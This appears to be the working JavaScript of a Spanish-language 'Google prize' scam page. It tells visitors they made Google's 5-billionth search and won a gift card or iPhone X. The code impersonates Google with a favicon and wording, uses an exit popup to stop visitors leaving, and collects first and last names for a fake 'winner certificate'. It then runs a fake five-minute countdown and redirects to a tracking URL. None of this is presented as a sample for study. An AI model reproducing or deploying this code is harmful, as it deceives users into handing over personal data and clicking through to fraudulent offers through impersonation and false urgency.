var exitpop = true;
window.onbeforeunload = function() { 
	if(exitpop) {
		exitpop = false;
		return "¡Has hecho la búsqueda de Google 5 billones!\n\n ¿Realmente quieres dejar esta página y renunciar a tu recompensa?"; 
	}
}

// var title_name = true;
// window.setInterval(function(){
// 	if (title_name){
// 		document.title = "(1) Google";
// 	}else{
// 		document.title = "Google";
// 	}
// 	title_name = !title_name;
// }, 1000);

var current_path = window.location.pathname;
var claimed_prize = false;
$(".prize").click(function(){
	if (claimed_prize) return;
	claimed_prize = true;
	DeactivateConfetti();
	$(".prize_button").css("background-color", "grey");
	$(this).children(".prize_button").css("background-color", "#00c853");
	$(".prize_button.confirm").css("background-color", "#00c853");
	$(".prize_button.submit_certificate").css("background-color", "#00c853");
	$(".prize_button.finish").css("background-color", "#00c853");
	$(this).children(".real_prize").children(".real_prize_image").attr("src", "amazon_card.jpg");
	if ($(this).hasClass("one")){
		$(".prize.two").children(".real_prize").children(".real_prize_image").attr("src", "google_play_card.jpg");
		$(".prize.three").children(".real_prize").children(".real_prize_image").attr("src", "apple_watch.gif");
	}else if ($(this).hasClass("two")){
		$(".prize.one").children(".real_prize").children(".real_prize_image").attr("src", "google_play_card.jpg");
		$(".prize.three").children(".real_prize").children(".real_prize_image").attr("src", "apple_watch.gif");
	}else if ($(this).hasClass("three")){
		$(".prize.two").children(".real_prize").children(".real_prize_image").attr("src", "google_play_card.jpg");
		$(".prize.one").children(".real_prize").children(".real_prize_image").attr("src", "apple_watch.gif");
	}
	$(".prize_image").fadeTo(2000, 0, function(){
		
	});
	$(".real_prize").fadeIn(2000, function(){
		window.setInterval(function(){
			document.body.style.overflow = 'hidden';
			// $("#black_overlay").css({"width": "100%", "height": "100%"});
			$("#black_overlay, #prize_confirmation").show();
		},2000);
	});
});

$(".prize_button.confirm").click(function(){
	$("#prize_confirmation").html('\
		<p>Usted ha hecho la búsqueda de Google 5 mil millones, nos gustaría agradecerle por utilizarnos como su proveedor de búsqueda. Tu iPhone X ha sido reservado para ti en nuestra página de socios.</p>\
		<p>Un empleado de Google está preparando su certificado de ganador. ¿Qué nombre debe figurar en el certificado?</p>\
		<div id="certificate_form">\
			<p class="certificate_label">Nombre de pila</p>\
			<input type="text" class="certificate_data"><br>\
			<p class="certificate_label">Apellido</p>\
			<input type="text" class="certificate_data">\
		</div>\
		<div class="prize_button submit_certificate">Continuar</div>\
		');
	$(".prize_button.submit_certificate").click(function(){
		$("#prize_confirmation").html('\
			<p>Su certificado de transferencia de premios ya está listo.</p>\
			<p>Importante: Como nuestros premios son muy solicitados, sólo podemos reservar su premio por un máximo de 5 minutos. Tendrá que completar el formulario de envío de premios durante este tiempo, de lo contrario, su premio se perderá. Desafortunadamente, esto está determinado por las reglas.</p>\
			<p id="limit_notice">Su iPhone X está reservado para las <span id="minutes">5</span>:<span id="seconds">00</span> minutos.</p>\
			<div class="prize_button finish">RECLAME SU PREMIO</div>\
			');
		$(".prize_button.finish").click(function(){
			exitpop = false;
			window.location.href = "https://droplet-track.com/click.php?lp=1";
		});
		start_minute_timer("minutes", "seconds", 4, 59);
	});
});

$(".prize_button.abort").click(function(){
	window.location.href = "https://droplet-track.com/click.php?lp=1";
});




function start_second_timer(){
	var second_timer_seconds = 59;
	var second_timer_micro_seconds = 99;
	var second_timer = setInterval(function(){
		second_timer_micro_seconds -= 1;
		if (second_timer_micro_seconds<=0) {
			if (second_timer_seconds>0) {
				second_timer_micro_seconds = 99;
				second_timer_seconds -= 1;
			}else{
				clearInterval(second_timer);
			};
		};
		if (second_timer_micro_seconds<10) {
			second_timer_micro_seconds = "0"+second_timer_micro_seconds;
		};
		document.getElementById("second_timer_seconds").innerHTML = second_timer_seconds;
		document.getElementById("second_timer_microseconds").innerHTML = second_timer_micro_seconds;
	}, 10)
}

function start_minute_timer(minute_label, seconds_label, m, s){
	var minute_timer = window.setInterval(function(){
		s -= 1;
		if (s<0) {
			if (m>0) {
				s = 59;
				m -= 1;
			}else{
				s = 0;
				window.clearInterval(minute_timer);
			};
		};
		if (s<10) {
			s = "0"+s;
		};
		document.getElementById(minute_label).innerHTML = m;
		document.getElementById(seconds_label).innerHTML = s;
	}, 1000)
}

var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
link.type = 'image/x-icon';
link.rel = 'shortcut icon';
link.href = current_path+'googleg_lodp.ico';
document.getElementsByTagName('head')[0].appendChild(link);